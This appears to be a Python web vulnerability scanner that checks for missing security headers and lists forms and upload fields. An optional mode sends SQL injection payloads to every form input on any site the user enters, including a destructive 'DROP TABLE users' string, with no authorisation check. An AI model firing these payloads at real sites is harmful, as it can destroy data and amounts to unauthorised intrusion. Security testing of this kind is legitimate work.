import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os

def scan_common_vulnerabilities(url):
    """Scans for common web vulnerabilities (headers, etc.)."""
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, "html.parser")
        vulnerabilities = []

        if "X-Frame-Options" not in response.headers:
            vulnerabilities.append("Missing X-Frame-Options header (Potential Clickjacking)")
        if "X-Content-Type-Options" not in response.headers:
            vulnerabilities.append("Missing X-Content-Type-Options (MIME-sniffing)")
        if "Content-Security-Policy" not in response.headers:
            vulnerabilities.append("Missing Content Security Policy (CSP) (XSS risk)")
        else:
            csp_header = response.headers.get("Content-Security-Policy")
            if "unsafe-inline" in csp_header or "unsafe-eval" in csp_header:
                vulnerabilities.append("Weak CSP: 'unsafe-inline' or 'unsafe-eval' present")
        if "Strict-Transport-Security" not in response.headers:
            vulnerabilities.append("Missing HSTS header (MITM risk)")

        scripts = soup.find_all("script")
        for script in scripts:
            if script.get("src"):
                script_url = urljoin(url, script.get("src"))
                if "jquery" in script_url.lower():
                    vulnerabilities.append(
                        "Potential use of jQuery. Check for known vulnerabilities in version used.")
        if vulnerabilities:
            print(f"Common Vulnerabilities found on {url}:")
            for vulnerability in vulnerabilities:
                print(f"- {vulnerability}")
        else:
            print(f"No common vulnerabilities detected on {url} based on basic checks.")
    except requests.exceptions.RequestException as e:
        print(f"Error accessing {url}: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

def scan_injection_and_uploads(url):
    """Scans for SQL injection, form issues, and file uploads."""
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, "html.parser")
        vulnerabilities = []

        forms = soup.find_all("form")
        if forms:
            for form in forms:
                inputs = form.find_all(["input", "textarea"])
                if inputs:
                    vulnerabilities.append(
                        f"Form found at {urljoin(url, form.get('action', ''))}: Potential SQL Injection Risk. Test inputs manually.")
                    for input_tag in inputs:
                        input_name = input_tag.get('name')
                        if input_name:
                            print(f"Input Field Name: {input_name}")

        file_uploads = soup.find_all("input", type="file")
        if file_uploads:
            vulnerabilities.append("File upload fields found. Verify file type restrictions.")

        if vulnerabilities:
            print(f"Injection/Upload Vulnerabilities found on {url}:")
            for vulnerability in vulnerabilities:
                print(f"- {vulnerability}")
        else:
            print(f"No injection/upload vulnerabilities detected on {url} based on basic checks.")
    except requests.exceptions.RequestException as e:
        print(f"Error accessing {url}: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

def test_sql_injection(url, form_action, input_name, payload):
    """Attempts a basic SQL injection test (USE WITH CAUTION)."""
    try:
        full_url = urljoin(url, form_action)
        data = {input_name: payload}
        response = requests.post(full_url, data=data)
        if response.status_code == 200:
            if any(substring in response.text.lower() for substring in ["error", "syntax", "mysql", "sql"]):
                print(f"Possible SQL Injection vulnerability detected with payload: {payload} on input {input_name}")
                print(f"Response Content: {response.text}") # print the response content for debugging
            else:
                print(f"No obvious SQL injection detected with payload: {payload} on input {input_name}")
        else:
            print(f"Request to {full_url} failed: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error during SQL injection test: {e}")

if __name__ == "__main__":
    while True:
        print("Select scan type:")
        print("1. Scan for Common Vulnerabilities")
        print("2. Scan for SQL Injection/Form/Upload Vulnerabilities")
        print("3. Exit")

        choice = input("Enter your choice (1, 2, or 3): ")

        if choice == "1":
            website_url = input("Enter website URL: ")
            if not website_url.startswith(("http://", "https://")):
                website_url = "https://" + website_url
            scan_common_vulnerabilities(website_url)
        elif choice == "2":
            website_url = input("Enter website URL: ")
            if not website_url.startswith(("http://", "https://")):
                website_url = "https://" + website_url
            scan_injection_and_uploads(website_url)
            test_choice = input("Test SQL Injection on identified forms? (yes/no): ")
            if test_choice.lower() == "yes":
                try:
                    soup = BeautifulSoup(requests.get(website_url).content, "html.parser")
                    forms = soup.find_all("form")
                    for form in forms:
                        form_action = form.get('action', '')
                        inputs = form.find_all(["input", "textarea"])
                        for input_tag in inputs:
                            input_name = input_tag.get('name')
                            if input_name:
                                payloads = ["' OR '1'='1", "1; DROP TABLE users--", "' OR '1'='1'--", "admin'--"]
                                for payload in payloads:
                                    test_sql_injection(website_url, form_action, input_name, payload)
                except requests.exceptions.RequestException as e:
                    print(f"Error fetching website for SQL injection testing: {e}")
                except Exception as e:
                    print(f"An error occurred during SQL Injection Testing: {e}")

        elif choice == "3":
            break
        else:
            print("Invalid choice. Please enter 1, 2, or 3.")
        print("-" * 30)



        